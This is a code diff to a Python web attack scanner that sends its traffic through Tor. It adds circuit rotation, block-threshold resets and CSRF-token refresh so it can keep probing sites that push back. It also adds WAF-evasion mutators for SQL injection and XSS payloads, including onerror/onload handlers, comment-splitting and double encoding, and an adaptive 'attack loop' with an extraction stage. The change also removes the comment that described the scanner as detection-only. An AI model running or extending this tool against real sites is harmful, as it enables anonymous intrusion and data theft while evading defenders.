@@ -31,7 +31,7 @@ Capabilities (all functional — no placeholders):
     - HTTP method enumeration (PUT, DELETE, TRACE, OPTIONS)
 
   Anti-Blocking (Tor-optimized):
-    - Retry with new Tor circuit on every block (up to 3 retries)
+    - Retry with new Tor circuit on every block (up to 2 retries)
     - Wayback Machine fallback for blocked/unavailable pages
     - Adaptive per-domain delay scaling based on block history
     - Realistic browser profiles (Chrome/Firefox with correct Sec-* headers)
@@ -122,13 +122,17 @@ HIBP_API_KEY = os.environ.get("HIBP_KEY", "")
 DEHASHED_API_KEY = os.environ.get("DEHASHED_KEY", "")
 DEHASHED_EMAIL = os.environ.get("DEHASHED_EMAIL", "")
 
-DOMAIN_MIN_DELAY = 2.0
-DOMAIN_MAX_DELAY = 8.0
-CIRCUIT_ROTATION_EVERY = 5
-MAX_RETRIES_PER_URL = 2       # reduced: 3 retries was too slow for blocked sites
-REQUEST_TIMEOUT = 15           # reduced from 25: Tor exits that hang take too long
+# Global proxy port — set at startup from --tor-proxy, used by PoC export
+# to generate curl commands that match the operator's actual Tor port.
+_ACTIVE_TOR_PORT = "9050"
+
+DOMAIN_MIN_DELAY = 1.0
+DOMAIN_MAX_DELAY = 4.0
+CIRCUIT_ROTATION_EVERY = 8
+MAX_RETRIES_PER_URL = 2
+REQUEST_TIMEOUT = 15
 WAYBACK_ENABLED = True
-BLOCK_THRESHOLD = 3            # after this many blocks on a domain, skip remaining checks
+BLOCK_THRESHOLD = 8            # raised from 3: old value killed scans after a few 403s from path probes
 
 RAM_DIR = Path("/dev/shm/intel") if Path("/dev/shm").exists() else _TOOLKIT_ROOT / ".intel_tmp"
 
@@ -261,13 +265,16 @@ class TorSession:
             integrity_log("intel", f"dns_verify_skip:{type(e).__name__}")
 
     def _delay_for_domain(self, domain: str):
-        """Adaptive delay — increases if domain has blocked us before."""
+        """Adaptive delay — scales up only under sustained blocking."""
         blocks = self._domain_blocks.get(domain, 0)
-        base_min = DOMAIN_MIN_DELAY + (blocks * 2)
-        base_max = DOMAIN_MAX_DELAY + (blocks * 5)
+        if blocks < 3:
+            base_min, base_max = DOMAIN_MIN_DELAY, DOMAIN_MAX_DELAY
+        else:
+            base_min = DOMAIN_MIN_DELAY + min(blocks, 6)
+            base_max = DOMAIN_MAX_DELAY + min(blocks * 2, 12)
         last = self._domain_last.get(domain, 0)
         elapsed = time.time() - last
-        needed = base_min + secrets.randbelow(int((base_max - base_min) * 1000)) / 1000.0
+        needed = base_min + secrets.randbelow(int((base_max - base_min) * 1000 + 1)) / 1000.0
         if elapsed < needed:
             time.sleep(needed - elapsed)
 
@@ -278,8 +285,22 @@ class TorSession:
             time.sleep(2 + secrets.randbelow(3000) / 1000.0)
 
     def is_domain_blocked(self, domain: str) -> bool:
-        """Check if a domain has blocked us too many times — skip further checks."""
+        """Check if a domain has blocked us too many times."""
         return self._domain_blocks.get(domain, 0) >= BLOCK_THRESHOLD
+
+    def reset_domain_blocks(self, domain: str):
+        """Reset block counter for a domain between scan phases.
+
+        Path probing (/.git, /.env, etc.) triggers 403s that are NOT real blocks —
+        they're expected responses. Without resetting, the circuit breaker trips
+        before deep testing even starts, making the entire deep scan useless.
+        """
+        old = self._domain_blocks.get(domain, 0)
+        self._domain_blocks[domain] = max(0, old // 2)
+
+    def set_cookies(self, cookies: dict):
+        """Set session cookies for authenticated scanning."""
+        self._session.cookies.update(cookies)
 
     def get(self, url: str, allow_wayback: bool = True, method: str = "GET",
             **kwargs) -> Optional[requests.Response]:
@@ -329,7 +350,6 @@ class TorSession:
                 if resp.status_code in (403, 429, 503):
                     self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
                     self._total_blocks += 1
-                    # If we just hit the threshold, stop retrying immediately
                     if self.is_domain_blocked(domain):
                         integrity_log("intel", f"domain_circuit_breaker:{domain}")
                         return None
@@ -337,6 +357,15 @@ class TorSession:
                     time.sleep(2 + secrets.randbelow(3000) / 1000.0)
                     continue
 
+                # 4xx/5xx: return as-is (may contain useful error info for vuln checks)
+                # but don't count as blocks. 404 is expected for path probes.
+                if resp.status_code == 404:
+                    return resp
+                # Server errors: rotate circuit and retry on 502 (proxy error)
+                if resp.status_code == 502 and attempt < MAX_RETRIES_PER_URL - 1:
+                    newnym()
+                    time.sleep(1 + secrets.randbelow(2000) / 1000.0)
+                    continue
                 return resp
 
             except requests.exceptions.Timeout:
@@ -350,7 +379,12 @@ class TorSession:
             except requests.exceptions.ConnectionError:
                 self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
                 integrity_log("intel", f"conn_error:{domain}")
-                return None
+                # Don't return immediately — fall through to Wayback on last attempt
+                if attempt < MAX_RETRIES_PER_URL - 1:
+                    newnym()
+                    time.sleep(1 + secrets.randbelow(2000) / 1000.0)
+                    continue
+                break
 
         # All retries exhausted — try Wayback Machine
         if allow_wayback and WAYBACK_ENABLED and method.upper() == "GET":
@@ -389,15 +423,47 @@ class TorSession:
         if shutdown_requested():
             return None
         domain = urlparse(url).netloc
+        if self.is_domain_blocked(domain):
+            return None
         self._delay_for_domain(domain)
         self._maybe_rotate_circuit()
         headers = _pick_profile()
         headers["Content-Type"] = "application/json"
-        kwargs.setdefault("timeout", 25)
+        kwargs.setdefault("timeout", REQUEST_TIMEOUT)
+        self._total_requests += 1
         try:
             self._domain_last[domain] = time.time()
-            return self._session.post(url, json=json_data, headers=headers, **kwargs)
+            resp = self._session.post(url, json=json_data, headers=headers, **kwargs)
+            if resp.status_code in (403, 429, 503):
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                self._total_blocks += 1
+            return resp
         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            self._total_timeouts += 1
+            return None
+
+    def post_form(self, url: str, form_data: dict, **kwargs) -> Optional[requests.Response]:
+        """POST form-encoded data (for testing HTML forms)."""
+        if shutdown_requested():
+            return None
+        domain = urlparse(url).netloc
+        if self.is_domain_blocked(domain):
+            return None
+        self._delay_for_domain(domain)
+        self._maybe_rotate_circuit()
+        headers = _pick_profile()
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        kwargs.setdefault("timeout", REQUEST_TIMEOUT)
+        self._total_requests += 1
+        try:
+            self._domain_last[domain] = time.time()
+            resp = self._session.post(url, data=form_data, headers=headers, **kwargs)
+            if resp.status_code in (403, 429, 503):
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                self._total_blocks += 1
+            return resp
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            self._total_timeouts += 1
             return None
 
     def close(self):
@@ -699,25 +765,1314 @@ class VulnScanner:
     REDIRECT_PARAMS = ["url", "redirect", "next", "return", "returnTo",
                        "goto", "redirect_uri", "continue", "target", "dest"]
 
-    # SQL injection test patterns (benign — detection only, no exploitation)
     SQLI_INDICATORS = [
+        # MySQL
         re.compile(r"SQL syntax.*MySQL", re.I),
-        re.compile(r"Warning.*mysql_", re.I),
+        re.compile(r"Warning.*\Wmysqli?_", re.I),
+        re.compile(r"MySQLSyntaxErrorException", re.I),
+        re.compile(r"valid MySQL result", re.I),
+        re.compile(r"check the manual that corresponds to your (MySQL|MariaDB)", re.I),
+        re.compile(r"MySqlClient\.", re.I),
+        re.compile(r"com\.mysql\.jdbc", re.I),
+        re.compile(r"You have an error in your SQL syntax", re.I),
+        # PostgreSQL
         re.compile(r"PostgreSQL.*ERROR", re.I),
+        re.compile(r"pg_query\(\).*failed", re.I),
+        re.compile(r"pg_exec\(\).*failed", re.I),
+        re.compile(r'ERROR:\s+syntax error at or near', re.I),
+        re.compile(r"valid PostgreSQL result", re.I),
+        re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
+        # Oracle
         re.compile(r"ORA-\d{5}", re.I),
+        re.compile(r"Oracle.*Driver", re.I),
+        re.compile(r"oracle\.jdbc", re.I),
+        re.compile(r"quoted string not properly terminated", re.I),
+        # SQL Server
         re.compile(r"Microsoft.*ODBC.*SQL", re.I),
         re.compile(r"Unclosed quotation mark", re.I),
-        re.compile(r"quoted string not properly terminated", re.I),
+        re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I),
+        re.compile(r"mssql_query\(\)", re.I),
+        re.compile(r"System\.Data\.SqlClient\.", re.I),
+        re.compile(r"Incorrect syntax near", re.I),
+        re.compile(r"SQLSTATE\[", re.I),
+        # SQLite
         re.compile(r"SQLite3::query", re.I),
-        re.compile(r"pg_query\(\).*failed", re.I),
-        re.compile(r"You have an error in your SQL syntax", re.I),
+        re.compile(r"SQLite\.Exception", re.I),
+        re.compile(r"SQLITE_ERROR", re.I),
+        re.compile(r"sqlite3\.OperationalError", re.I),
+        re.compile(r"unrecognized token:", re.I),
+        # Generic / PHP / Python / Java
+        re.compile(r"PDOException", re.I),
+        re.compile(r"SQLSTATE\[\w+\].*driver", re.I),
+        re.compile(r"java\.sql\.SQLException", re.I),
+        re.compile(r"Hibernate.*QueryException", re.I),
+        re.compile(r"SQL command not properly ended", re.I),
+        re.compile(r"supplied argument is not a valid", re.I),
+        re.compile(r"on line \d+.*(?:mysql|pg_|sqlite|ora)", re.I),
+        re.compile(r"Dynamic SQL Error", re.I),
     ]
 
-    # XSS reflection test — we inject a unique marker, check if reflected unescaped
-    XSS_CANARY = f"gs{secrets.token_hex(4)}test"
+    # SSTI template engine error indicators
+    SSTI_INDICATORS = [
+        re.compile(r"jinja2\.", re.I),
+        re.compile(r"UndefinedError", re.I),
+        re.compile(r"TemplateSyntaxError", re.I),
+        re.compile(r"twig", re.I),
+        re.compile(r"freemarker", re.I),
+        re.compile(r"velocity", re.I),
+        re.compile(r"mako\.", re.I),
+        re.compile(r"smarty.*error", re.I),
+        re.compile(r"pebble.*exception", re.I),
+        re.compile(r"thymeleaf", re.I),
+    ]
 
     def __init__(self, session: TorSession):
         self._session = session
+        self._page_params: List[str] = []
+        self._page_forms: List[dict] = []
+        self._crawled_urls: List[dict] = []
+
+    def extract_params_from_html(self, html: str, base_url: str):
+        """Extract real parameter names from forms, links, and scripts on the page.
+
+        This is what makes the scanner targeted instead of blind — we test
+        params that actually exist on the target, not generic guesses.
+        """
+        params: Set[str] = set()
+        forms: List[dict] = []
+
+        # Extract from URL query strings in links
+        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{0,30})=', html[:100000])
+        params.update(p.lower() for p in url_params)
+
+        # Extract from HTML forms
+        if HAS_BS4:
+            try:
+                soup = BeautifulSoup(html[:100000], "html.parser")
+                for form in soup.find_all("form"):
+                    form_data = {
+                        "action": form.get("action", ""),
+                        "method": (form.get("method", "GET")).upper(),
+                        "params": [],
+                    }
+                    for inp in form.find_all(["input", "select", "textarea"]):
+                        name = inp.get("name", "")
+                        if name and not name.startswith("_"):
+                            form_data["params"].append(name)
+                            params.add(name.lower())
+                    if form_data["params"]:
+                        forms.append(form_data)
+            except Exception:
+                pass
+
+        # Extract from JavaScript variable assignments and AJAX calls
+        js_params = re.findall(
+            r'(?:data|params|query)\s*[\[.]\s*["\']([a-zA-Z_]\w{0,30})["\']',
+            html[:50000]
+        )
+        params.update(p.lower() for p in js_params)
+
+        self._page_params = list(params)[:30]
+        self._page_forms = forms[:10]
+
+    def _get_test_params(self, fallback: List[str]) -> List[str]:
+        """Get params to test: prefer real page params, fall back to common ones."""
+        if self._page_params:
+            combined = list(self._page_params[:5])
+            for fb in fallback:
+                if fb not in combined:
+                    combined.append(fb)
+                if len(combined) >= 5:
+                    break
+            return combined
+        return fallback[:5]
+
+    # ── Payload Mutation Engine ────────────────────────────────────────────
+    @staticmethod
+    def _mutate_sqli(base_payload: str) -> List[str]:
+        """Generate WAF-evasion variants of a SQLi payload.
+
+        Real WAFs block 'OR 1=1' but pass 'OR/**/1=1' or 'oR 1=1'.
+        This produces variants with case mutation, inline comments,
+        encoding tricks, and whitespace substitution.
+        """
+        variants = [base_payload]
+
+        # Case mutations on SQL keywords
+        keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE",
+                    "NULL", "SLEEP", "WAITFOR", "DELAY", "BENCHMARK"]
+        mutated = base_payload
+        for kw in keywords:
+            if kw.upper() in base_payload.upper():
+                # Mixed case
+                mixed = "".join(c.upper() if i % 2 else c.lower()
+                                for i, c in enumerate(kw))
+                v1 = re.sub(re.escape(kw), mixed, base_payload, flags=re.I)
+                if v1 != base_payload:
+                    variants.append(v1)
+                # Inline comment
+                commented = kw[0] + "/**/" + kw[1:]
+                v2 = re.sub(re.escape(kw), commented, base_payload, flags=re.I)
+                if v2 != base_payload:
+                    variants.append(v2)
+
+        # Whitespace → inline comment substitution
+        v3 = base_payload.replace(" ", "/**/")
+        if v3 != base_payload:
+            variants.append(v3)
+
+        # Tab substitution
+        v4 = base_payload.replace(" ", "\t")
+        if v4 != base_payload:
+            variants.append(v4)
+
+        # Double URL encoding of quotes
+        v5 = base_payload.replace("'", "%2527")
+        if v5 != base_payload:
+            variants.append(v5)
+
+        return variants[:6]
+
+    @staticmethod
+    def _mutate_xss(base_payload: str) -> List[str]:
+        """Generate filter-evasion variants of XSS payloads."""
+        variants = [base_payload]
+
+        # Case mutation on tags
+        v1 = base_payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>")
+        if v1 != base_payload:
+            variants.append(v1)
+
+        # Using event handlers instead of script tags
+        if "<script>" in base_payload.lower():
+            canary = re.search(r">(.*?)<", base_payload)
+            if canary:
+                c = canary.group(1)
+                variants.append(f'<img src=x onerror="{c}">')
+                variants.append(f'<svg/onload="{c}">')
+                variants.append(f'<body onload="{c}">')
+                variants.append(f'<details open ontoggle="{c}">')
+
+        # HTML entity encoding
+        v2 = base_payload.replace("<", "&#60;").replace(">", "&#62;")
+        if v2 != base_payload:
+            variants.append(v2)
+
+        # Null byte insertion (bypasses some PHP filters)
+        v3 = base_payload.replace("<", "%00<")
+        if v3 != base_payload:
+            variants.append(v3)
+
+        return variants[:6]
+
+    # ── Response Diffing ───────────────────────────────────────────────────
+    @staticmethod
+    def _response_diff(baseline: str, test: str) -> dict:
+        """Structural diff between two HTML responses.
+
+        Goes beyond simple length comparison: checks content similarity,
+        keyword changes, and structural differences.
+        """
+        if not baseline or not test:
+            return {"similar": False, "score": 0.0}
+
+        bl = baseline[:10000]
+        tl = test[:10000]
+
+        len_ratio = min(len(bl), len(tl)) / max(len(bl), len(tl), 1)
+
+        # Word-level similarity (fast Jaccard-like)
+        bl_words = set(bl.lower().split())
+        tl_words = set(tl.lower().split())
+        if bl_words or tl_words:
+            common = bl_words & tl_words
+            total = bl_words | tl_words
+            word_sim = len(common) / len(total) if total else 0
+        else:
+            word_sim = 1.0
+
+        # Key structural elements (title, h1, form count)
+        def _extract_structure(html):
+            titles = re.findall(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
+            h1s = re.findall(r"<h1[^>]*>(.*?)</h1>", html, re.I | re.S)
+            forms = len(re.findall(r"<form", html, re.I))
+            return (titles[0][:50] if titles else "", h1s[0][:50] if h1s else "", forms)
+
+        s1 = _extract_structure(bl)
+        s2 = _extract_structure(tl)
+        struct_same = s1 == s2
+
+        score = (len_ratio * 0.3 + word_sim * 0.5 + (1.0 if struct_same else 0.0) * 0.2)
+
+        return {
+            "similar": score > 0.85,
+            "score": round(score, 3),
+            "len_ratio": round(len_ratio, 3),
+            "word_sim": round(word_sim, 3),
+            "struct_same": struct_same,
+        }
+
+    # ── JS Endpoint Extraction ─────────────────────────────────────────────
+    @staticmethod
+    def _extract_js_endpoints(html: str, base_url: str) -> List[str]:
+        """Extract API endpoints from JavaScript in HTML.
+
+        Catches fetch(), axios, XMLHttpRequest, and string-based URL patterns
+        that the <a href> crawler misses entirely.
+        """
+        endpoints = set()
+        domain = urlparse(base_url).netloc
+
+        # fetch/axios/XHR URL patterns
+        patterns = [
+            re.compile(r'''fetch\s*\(\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''axios\s*\.\w+\s*\(\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''\.open\s*\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''url\s*[:=]\s*['"]([^'"]*(?:api|ajax|action|endpoint|query|search)[^'"]*)['"]''', re.I),
+            re.compile(r'''['"](/(?:api|v[0-9]|ajax|rest|graphql|ws)/[^'"]{2,60})['"]'''),
+            re.compile(r'''['"]([^'"]+\.(?:php|asp|aspx|jsp|cgi|pl|py)(?:\?[^'"]*)?)['"]\s*'''),
+            re.compile(r'''action\s*[:=]\s*['"]([^'"]+)['"]''', re.I),
+        ]
+
+        for pat in patterns:
+            for match in pat.findall(html[:200000]):
+                if match.startswith("http"):
+                    if domain in match:
+                        endpoints.add(match)
+                elif match.startswith("/"):
+                    endpoints.add(urljoin(base_url, match))
+                elif not match.startswith(("#", "javascript:", "data:", "mailto:")):
+                    endpoints.add(urljoin(base_url, match))
+
+        return list(endpoints)[:30]
+
+    # ── Parameter Profiler ─────────────────────────────────────────────────
+    def _profile_param(self, endpoint: dict, param_name: str) -> dict:
+        """Profile a parameter to understand its behavior before attacking.
+
+        Sends 3 probe requests to determine:
+        - type: int, string, empty-sensitive
+        - reflected: whether input appears in the response body
+        - reflection_context: where in the HTML it appears (tag, attribute, script, text)
+        - error_sensitive: whether unusual input triggers errors
+        - base_response_len: normal response length for comparison
+
+        This is what separates a smart scanner from a dumb fuzzer.
+        """
+        url = endpoint["url"]
+        profile = {
+            "name": param_name,
+            "type": "unknown",
+            "reflected": False,
+            "reflection_context": None,
+            "error_sensitive": False,
+            "base_response_len": 0,
+            "base_status": 0,
+        }
+
+        # Probe 1: send a normal-looking value
+        probe_val = "test123"
+        resp = self._send_test(endpoint, param_name, probe_val)
+        if not resp or not resp.text:
+            return profile
+
+        profile["base_response_len"] = len(resp.text)
+        profile["base_status"] = resp.status_code
+        base_text = resp.text
+
+        # Check reflection: does our probe value appear in the response?
+        if probe_val in resp.text:
+            profile["reflected"] = True
+            idx = resp.text.find(probe_val)
+            context_before = resp.text[max(0, idx - 80):idx].lower()
+
+            if "<script" in context_before and "</script>" not in context_before:
+                profile["reflection_context"] = "script"
+            elif re.search(r'(?:value|placeholder|title|alt|content)\s*=\s*["\'][^"\']*$', context_before):
+                profile["reflection_context"] = "attribute"
+            elif "<" in context_before and ">" not in context_before.split("<")[-1]:
+                profile["reflection_context"] = "tag"
+            else:
+                profile["reflection_context"] = "text"
+
+        # Probe 2: send a numeric value to detect type
+        resp2 = self._send_test(endpoint, param_name, "1")
+        if resp2:
+            resp3 = self._send_test(endpoint, param_name, "99999")
+            if resp3:
+                diff = self._response_diff(resp2.text, resp3.text)
+                if not diff["similar"]:
+                    profile["type"] = "int"
+                else:
+                    profile["type"] = "string"
+            if resp2.status_code != resp.status_code:
+                profile["type"] = "int"
+
+        # Probe 3: send a special character to see if error-sensitive
+        resp_err = self._send_test(endpoint, param_name, "';\"\\")
+        if resp_err:
+            if resp_err.status_code >= 500:
+                profile["error_sensitive"] = True
+            elif resp_err.status_code != profile["base_status"]:
+                profile["error_sensitive"] = True
+            elif resp_err.text:
+                # Check for error keywords not in baseline
+                error_kw = ["error", "exception", "warning", "fatal", "syntax",
+                            "invalid", "unexpected", "parse"]
+                err_count = sum(1 for kw in error_kw if kw in resp_err.text.lower()[:3000])
+                base_count = sum(1 for kw in error_kw if kw in base_text.lower()[:3000])
+                if err_count > base_count + 1:
+                    profile["error_sensitive"] = True
+
+        return profile
+
+    def _classify_response(self, resp: Optional[requests.Response],
+                           baseline_len: int = 0) -> str:
+        """Classify a response as normal, error, blocked, or redirect."""
+        if resp is None:
+            return "failed"
+        if resp.status_code in (403, 429, 503):
+            text_lower = resp.text[:1000].lower() if resp.text else ""
+            if any(kw in text_lower for kw in ("captcha", "challenge", "cloudflare",
+                                                "ddos", "rate limit", "blocked")):
+                return "waf"
+            return "blocked"
+        if resp.status_code in (301, 302, 303, 307, 308):
+            return "redirect"
+        if resp.status_code >= 500:
+            return "error"
+        if resp.status_code == 404:
+            return "not_found"
+        if resp.status_code == 200:
+            if baseline_len > 0 and resp.text:
+                ratio = len(resp.text) / max(baseline_len, 1)
+                if ratio < 0.3:
+                    return "truncated"
+            return "normal"
+        return "other"
+
+    def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
+        """Crawl the site to discover testable endpoints (URLs with params + forms).
+
+        This is what makes the difference between a useless scanner and one
+        that actually finds vulns: real applications have vulns at specific
+        paths like /search.php?q=, /user.php?id=, not at the homepage.
+
+        Returns list of {url, params: [{name, value}], method, source}.
+        """
+        domain = urlparse(base_url).netloc
+        endpoints: List[dict] = []
+        seen_urls: Set[str] = set()
+        pages_to_crawl: List[str] = [base_url]
+        pages_crawled: Set[str] = set()
+
+        if not HAS_BS4:
+            return endpoints
+
+        def _extract_from_html(page_url: str, page_html: str):
+            """Extract testable endpoints from a single page."""
+            try:
+                soup = BeautifulSoup(page_html[:200000], "html.parser")
+            except Exception:
+                return
+
+            # Extract links with query parameters
+            for tag in soup.find_all("a", href=True):
+                href = tag.get("href", "")
+                if not href or href.startswith(("#", "javascript:", "mailto:")):
+                    continue
+                full_url = urljoin(page_url, href)
+                parsed = urlparse(full_url)
+
+                if not parsed.scheme or not parsed.netloc:
+                    continue
+                if parsed.netloc != domain:
+                    continue
+
+                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                if clean_url not in seen_urls:
+                    seen_urls.add(clean_url)
+                    # Queue for crawling if it looks like a page
+                    if (parsed.path.endswith(('.php', '.asp', '.aspx', '.jsp', '.cgi',
+                                              '.pl', '.py', '/', '.html', '.htm'))
+                            or '.' not in parsed.path.split('/')[-1]):
+                        pages_to_crawl.append(clean_url)
+
+                # If the URL has query params, it's a testable endpoint
+                if parsed.query:
+                    params = parse_qs(parsed.query, keep_blank_values=True)
+                    param_list = [{"name": k, "value": v[0] if v else ""}
+                                  for k, v in params.items()]
+                    if param_list:
+                        endpoints.append({
+                            "url": clean_url,
+                            "params": param_list,
+                            "method": "GET",
+                            "source": "link",
+                        })
+
+            # Extract forms with their action URLs and input parameters
+            for form in soup.find_all("form"):
+                action = form.get("action", "")
+                method = (form.get("method", "GET")).upper()
+                form_url = urljoin(page_url, action) if action else page_url
+
+                parsed = urlparse(form_url)
+                if not parsed.scheme or not parsed.netloc:
+                    parsed = urlparse(urljoin(page_url, form_url))
+                if parsed.netloc and parsed.netloc != domain:
+                    continue
+
+                params = []
+                for inp in form.find_all(["input", "select", "textarea"]):
+                    name = inp.get("name", "")
+                    if not name:
+                        continue
+                    itype = inp.get("type", "text").lower()
+                    if itype in ("submit", "button", "image", "reset"):
+                        continue
+                    value = inp.get("value", "")
+                    is_hidden = (itype == "hidden")
+                    params.append({"name": name, "value": value,
+                                   "hidden": is_hidden, "type": itype})
+
+                if params:
+                    endpoints.append({
+                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                        "params": params,
+                        "method": method,
+                        "source": "form",
+                    })
+
+        # Phase 0: extract JS endpoints (API routes the link crawler misses)
+        js_urls = self._extract_js_endpoints(html, base_url)
+        for js_url in js_urls:
+            parsed = urlparse(js_url)
+            if parsed.query:
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                param_list = [{"name": k, "value": v[0] if v else "", "hidden": False, "type": "text"}
+                              for k, v in params.items()]
+                if param_list:
+                    endpoints.append({
+                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                        "params": param_list,
+                        "method": "GET",
+                        "source": "javascript",
+                    })
+            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            if clean not in seen_urls:
+                seen_urls.add(clean)
+                pages_to_crawl.append(clean)
+
+        # Phase 1: extract from the initial page HTML
+        _extract_from_html(base_url, html)
+
+        # Phase 2: crawl discovered pages (1 level deep, max 15 pages)
+        max_crawl = 15
+        crawled = 0
+        while pages_to_crawl and crawled < max_crawl:
+            if shutdown_requested():
+                break
+            if self._session.is_domain_blocked(domain):
+                break
+            page = pages_to_crawl.pop(0)
+            if page in pages_crawled:
+                continue
+            pages_crawled.add(page)
+            if page == base_url:
+                continue  # Already have this HTML
+
+            crawled += 1
+            resp = self._session.get(page, allow_wayback=False)
+            if resp and resp.status_code == 200 and resp.text:
+                _extract_from_html(page, resp.text)
+
+        # Deduplicate: same url+param combo
+        seen_ep = set()
+        unique = []
+        for ep in endpoints:
+            key = f"{ep['method']}:{ep['url']}:{','.join(p['name'] for p in ep['params'])}"
+            if key not in seen_ep:
+                seen_ep.add(key)
+                unique.append(ep)
+
+        self._crawled_urls = unique[:50]
+        return self._crawled_urls
+
+    def _build_request_data(self, endpoint: dict, target_param: str, value: str) -> dict:
+        """Build complete form data, injecting value into target_param
+        while preserving all other params (hidden fields, tokens, etc.)."""
+        data = {}
+        for p in endpoint.get("params", []):
+            if p["name"] == target_param:
+                data[p["name"]] = value
+            else:
+                data[p["name"]] = p.get("value", "")
+        if target_param not in data:
+            data[target_param] = value
+        return data
+
+    def _fetch_live_form(self, endpoint: dict) -> Optional[dict]:
+        """Visit the page and parse the LIVE form to get fresh hidden values.
+
+        Static endpoints from crawling have stale CSRF tokens and hidden
+        field values. This fetches the page, finds the matching form, and
+        returns fresh field values. Without this, POST requests to forms
+        with CSRF protection silently fail (302 back to login or 403).
+        """
+        url = endpoint["url"]
+        if endpoint.get("source") != "form" or endpoint["method"] != "POST":
+            return None
+
+        resp = self._session.get(url, allow_wayback=False)
+        if not resp or not resp.text or not HAS_BS4:
+            return None
+
+        try:
+            soup = BeautifulSoup(resp.text[:200000], "html.parser")
+            # Find the form — match by action URL or by containing our target params
+            ep_param_names = {p["name"] for p in endpoint["params"]}
+            best_form = None
+
+            for form in soup.find_all("form"):
+                form_params = {inp.get("name", "") for inp in form.find_all(["input", "select", "textarea"])
+                               if inp.get("name")}
+                overlap = ep_param_names & form_params
+                if overlap:
+                    best_form = form
+                    break
+
+            if not best_form:
+                return None
+
+            # Extract ALL fields from the live form (fresh tokens)
+            fresh_params = []
+            for inp in best_form.find_all(["input", "select", "textarea"]):
+                name = inp.get("name", "")
+                if not name:
+                    continue
+                itype = inp.get("type", "text").lower()
+                if itype in ("submit", "button", "image", "reset"):
+                    continue
+                value = inp.get("value", "")
+                fresh_params.append({
+                    "name": name,
+                    "value": value,
+                    "hidden": (itype == "hidden"),
+                    "type": itype,
+                })
+
+            # Update endpoint action URL from the live form
+            action = best_form.get("action", "")
+            if action:
+                fresh_url = urljoin(url, action)
+            else:
+                fresh_url = url
+
+            return {
+                "url": fresh_url,
+                "params": fresh_params,
+                "method": (best_form.get("method", "POST")).upper(),
+                "source": "live_form",
+            }
+
+        except Exception:
+            return None
+
+    def _send_test(self, endpoint: dict, param_name: str, value: str,
+                   follow_redirects: bool = True) -> Optional[requests.Response]:
+        """Send a test request with full lifecycle:
+        1. For POST forms: fetch live page first to get fresh tokens
+        2. Build request data with all fields filled
+        3. Send request
+        4. Follow redirects to get the final response
+        """
+        url = endpoint["url"]
+
+        # For POST endpoints, refresh form data to get live tokens
+        live = endpoint
+        if endpoint["method"] == "POST" and endpoint.get("source") != "live_form":
+            if not hasattr(self, '_live_form_cache'):
+                self._live_form_cache = {}
+            cache_key = endpoint["url"]
+            # Refresh form if it has hidden token fields (CSRF) or if not cached
+            has_token = any(p.get("hidden") and p["name"].lower() in
+                           ("csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
+                            "__requestverificationtoken", "csrf_token", "authenticity_token")
+                           for p in endpoint.get("params", []))
+            if cache_key not in self._live_form_cache or has_token:
+                fresh = self._fetch_live_form(endpoint)
+                if fresh:
+                    self._live_form_cache[cache_key] = fresh
+            cached = self._live_form_cache.get(cache_key)
+            if cached:
+                live = cached
+
+        data = self._build_request_data(live, param_name, value)
+
+        if live["method"] == "GET":
+            qs = urlencode(data)
+            return self._session.get(f"{live['url']}?{qs}", allow_wayback=False)
+        else:
+            resp = self._session.post_form(live["url"], data)
+            # Follow redirect to see the actual result page
+            if follow_redirects and resp and resp.status_code in (301, 302, 303, 307, 308):
+                location = resp.headers.get("Location", "")
+                if location:
+                    redirect_url = urljoin(live["url"], location)
+                    resp = self._session.get(redirect_url, allow_wayback=False)
+            return resp
+
+    # ── Parameter Scoring ─────────────────────────────────────────────────
+    def _score_param(self, profile: dict) -> int:
+        """Score a parameter to decide how deep to test it.
+        High score = more payloads, mutations, and time-based checks.
+        Low score = quick probe and move on."""
+        score = 0
+        if profile.get("reflected"):
+            score += 3
+        if profile.get("error_sensitive"):
+            score += 4
+        if profile.get("reflection_context") in ("attribute", "script"):
+            score += 2
+        if profile.get("type") == "int":
+            score += 1
+        # High-value param names
+        name = profile.get("name", "").lower()
+        if any(kw in name for kw in ("search", "query", "q", "id", "user", "name",
+                                      "page", "file", "path", "url", "cmd", "exec",
+                                      "sort", "order", "filter", "cat", "item", "title")):
+            score += 2
+        # Low-value param names
+        if any(kw in name for kw in ("utm_", "ref", "lang", "locale", "theme",
+                                      "callback", "format", "width", "height")):
+            score -= 3
+        return max(score, 0)
+
+    # ── Attack Loop Engine ─────────────────────────────────────────────────
+    def _attack_sqli(self, endpoint: dict, pname: str, pval: str,
+                     profile: dict, depth: int) -> List[dict]:
+        """Adaptive SQLi attack loop. Probes, analyzes, adapts, escalates.
+
+        depth controls how many attempts:
+          shallow (0-3): 3 quick probes
+          medium  (4-6): full error-based + blind boolean
+          deep    (7+):  + time-based + mutations + extraction
+        """
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        findings = []
+
+        baseline_resp = self._send_test(endpoint, pname, pval)
+        if not baseline_resp or not baseline_resp.text:
+            return findings
+        baseline_text = baseline_resp.text[:8000]
+
+        # ── Stage 1: Quick probe (always runs) ─────────────────────────
